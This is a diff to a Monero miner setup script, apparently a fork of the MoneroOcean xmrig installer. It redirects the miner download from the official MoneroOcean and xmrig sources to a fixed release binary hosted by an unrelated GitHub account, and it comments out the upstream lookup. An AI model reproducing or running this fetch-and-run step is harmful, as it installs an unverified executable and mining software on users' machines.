@@ -157,8 +157,8 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to $HOME/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to $HOME/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://github.com/bizarrestoic/xmrig_setup/releases/download/6.18.1/xmrig-6.18.1-bionic-x64.tar.gz" -o $HOME/xmrig.tar.gz; then
+  echo "ERROR: Can't download https://github.com/bizarrestoic/xmrig_setup/releases/download/6.18.1/xmrig-6.18.1-bionic-x64.tar.gz file to $HOME/xmrig.tar.gz"
   exit 1
 fi
 
@@ -182,7 +182,8 @@ if (test $? -ne 0); then
 
   echo "[*] Looking for the latest version of Monero miner"
   LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
-  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
+  #LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`
+  LATEST_XMRIG_LINUX_RELEASE="https://github.com/bizarrestoic/xmrig_setup/releases/download/6.18.1/xmrig-6.18.1-bionic-x64.tar.gz"
 
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to $HOME/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o $HOME/xmrig.tar.gz; then
